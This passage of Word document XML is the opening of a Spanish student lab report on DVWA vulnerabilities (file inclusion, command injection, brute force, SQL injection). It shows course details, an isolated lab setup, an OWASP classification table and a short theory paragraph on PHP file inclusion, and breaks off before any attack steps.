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5242D" w14:textId="30C25223" w:rsidR="00AE5F76" w:rsidRDefault="009E1026" w:rsidP="005D77FE">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3864"/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:t>INFORME #2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3864"/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:br/>
        <w:t>Gestión de Vulnerabilidades en Aplicaciones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A15F125" w14:textId="29D5CB67" w:rsidR="00AE5F76" w:rsidRDefault="009E1026" w:rsidP="005D77FE">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="4472C4"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>DVWA: File Inclusion  |  Command Injection  |  Brute Force  |  SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4315"/>
        <w:gridCol w:w="4315"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="2C1C0DBD" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="56D0DAC0" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Campo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="2564EE70" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detalle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="563B110A" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4B47D756" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Asignatura</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E1CE99E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Gestión de Vulnerabilidades en Aplicaciones</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="64F6072F" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="330980C7" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Programa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="0E9E2B76" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Especialización en Ciberseguridad</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="3CD07223" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D7E948D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Docente</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0C15D671" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Javier Mauricio Durán Vásquez</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="3BFB35E3" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="23B76E53" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Estudiante</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="4F10362D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Daniel Alejandro Aguirre Ceballos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="20C989BB" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2F4F21A1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Plataforma</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="09C9E101" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DVWA (Damn Vulnerable Web Application) — Nivel Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="1DFF5278" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="6EB57E68" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Fecha entrega</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="43BF53D1" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>14 de marzo de 2026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3EB5719C" w14:textId="77777777" w:rsidR="005D77FE" w:rsidRDefault="005D77FE" w:rsidP="005D77FE"/>
    <w:p w14:paraId="3E899534" w14:textId="2846C9B8" w:rsidR="00AE5F76" w:rsidRPr="005D77FE" w:rsidRDefault="009E1026" w:rsidP="005D77FE">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D77FE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Entorno de trabajo</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4314"/>
        <w:gridCol w:w="4316"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="072278D6" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="3F2DB89E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Componente</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="58105F3C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detalle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="5A239A7F" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="50825CC5" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Sistema atacante</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="342DBFCB" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Kali Linux (VM) — Prompt: danielaguirre@kali:~$</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="042BD06A" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="22EAEC7B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Sistema víctima</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="297EE534" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Metasploitable con DVWA preinstalado</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="2CF941DC" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FE721CA" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Red</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01080D77" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Red interna entre VMs (sin Internet requerido)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="1EE1C8CE" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="71604E2A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Nivel DVWA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="16A3A446" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="29239EAD" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="56E1433A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Herramientas</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1ADCF159" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Firefox, Hydra, sqlmap, Netcat, Metasploit, Burp Suite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="568B274A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="69680C70" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Este informe cubre las vulnerabilidades 5 a 8 del laboratorio, correspondientes al Informe #2. Todas comparten una causa raíz común: la aplicación confía en datos no confiables (input del usuario, parámetros HTTP, archivos cargados) sin tratarlos con la debida desconfianza sistemática. La diferencia entre ataques radica en el vector y el componente del sistema que se ve comprometido.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B207D1" w14:textId="57BD6796" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="183BBB96" w14:textId="77777777" w:rsidR="00CE4778" w:rsidRDefault="00CE4778"/>
    <w:p w14:paraId="63E2C2AD" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Clasificación OWASP Top 10 (2021) de las vulnerabilidades trabajadas:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2156"/>
        <w:gridCol w:w="2158"/>
        <w:gridCol w:w="2159"/>
        <w:gridCol w:w="2157"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="4932A695" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="0D535A51" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>#</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="51BC8561" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="4855BDAB" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Categoría OWASP 2021</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="1C5A2463" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Severidad típica</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="01609548" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="372D79F2" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="66AC0E41" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>File Inclusion (LFI/RFI)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="71ABCF8B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>A05 – Security Misconfiguration / A03 – Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6745F1F8" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="6B73CBC3" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="714BAAFE" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="7EEBC92F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Command Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="3691FFA5" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>A03:2021 – Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="1A092241" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="503A87BC" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="545CE1DD" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A51B607" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Brute Force</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7BC0DCBE" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>A07:2021 – Identification &amp; Authentication Failures</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="30E159B0" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="0F6AFFDF" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="7076061E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="7AD5B065" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SQL Injection (&amp; Blind)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="72DD0A80" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>A03:2021 – Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="24E8BB6D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2BBF5F6C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="005D77FE" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D77FE">
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Vulnerabilidad 5 — File Inclusion (LFI / RFI)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67BC810F" w14:textId="5F105543" w:rsidR="00AE5F76" w:rsidRDefault="00CE4778">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.1 </w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>Teoría</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005D629A" w14:textId="46983804" w:rsidR="005D77FE" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>La inclusión de archivos (File Inclusion) es una vulnerabilidad que surge cuando una aplicación web construye dinámicamente la ruta de un archivo a incluir o ejecutar usando datos controlables por el usuario, sin validar ni restringir qué archivos pueden ser referenciados. PHP expone esta debilidad a través de las funciones include(), require(), include_once() y require_once().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D21C22B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Existen dos variantes con impactos distintos:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2156"/>
        <w:gridCol w:w="2157"/>
        <w:gridCol w:w="2159"/>
        <w:gridCol w:w="2158"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="4411F018" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
